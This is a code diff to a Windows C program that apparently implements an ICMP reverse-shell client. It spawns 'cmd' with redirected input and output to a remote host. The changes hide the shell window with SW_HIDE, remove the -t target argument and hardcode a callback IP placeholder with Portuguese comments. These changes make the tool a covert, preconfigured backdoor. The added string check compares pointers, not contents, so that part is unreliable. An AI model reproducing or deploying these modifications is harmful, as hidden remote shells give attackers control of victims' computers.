@@ -77,6 +77,8 @@ int spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)
 	si.hStdOutput = out_write;
 	si.hStdInput = in_read;
 	si.dwFlags |= STARTF_USESTDHANDLES;
+	si.dwFlags |= STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
 
 	if (!CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA) &si, pi)) {
 		return STATUS_PROCESS_NOT_CREATED;
@@ -92,13 +94,12 @@ void usage(char *path)
 {
 	printf("%s [options] -t target\n", path);
 	printf("options:\n");
-	printf("  -t host            host ip address to send ping requests to\n");
 	printf("  -r                 send a single test icmp request and then quit\n");
 	printf("  -d milliseconds    delay between requests in milliseconds (default is %u)\n", DEFAULT_DELAY);
 	printf("  -o milliseconds    timeout in milliseconds\n");
 	printf("  -h                 this screen\n");
 	printf("  -b num             maximal number of blanks (unanswered icmp requests)\n");
-    printf("                     before quitting\n");
+    	printf("                     before quitting\n");
 	printf("  -s bytes           maximal data buffer size in bytes (default is 64 bytes)\n\n", DEFAULT_MAX_DATA_SIZE);
 	printf("In order to improve the speed, lower the delay (-d) between requests or\n");
     printf("increase the size (-s) of the data buffer\n");
@@ -207,7 +208,8 @@ int main(int argc, char **argv)
 
 
 	// set defaults
-	target = 0;
+	// Adicione IP Aqui
+	target = "0";
 	timeout = DEFAULT_TIMEOUT;
 	delay = DEFAULT_DELAY;
 	max_blanks = DEFAULT_MAX_BLANKS;
@@ -226,11 +228,6 @@ int main(int argc, char **argv)
 				case 'h':
 				    usage(*argv);
 					return 0;
-				case 't':
-					if (opt + 1 < argc) {
-						target = argv[opt + 1];
-					}
-					break;
 				case 'd':
 					if (opt + 1 < argc) {
 						delay = atol(argv[opt + 1]);
@@ -262,8 +259,8 @@ int main(int argc, char **argv)
 		}
 	}
 
-	if (!target) {
-		printf("you need to specify a host with -t. Try -h for more options\n");
+	if (target ==  "0") {
+		printf("Defina IP Manualmente");
 		return -1;
 	}
 	ip_addr = to_ip(target);
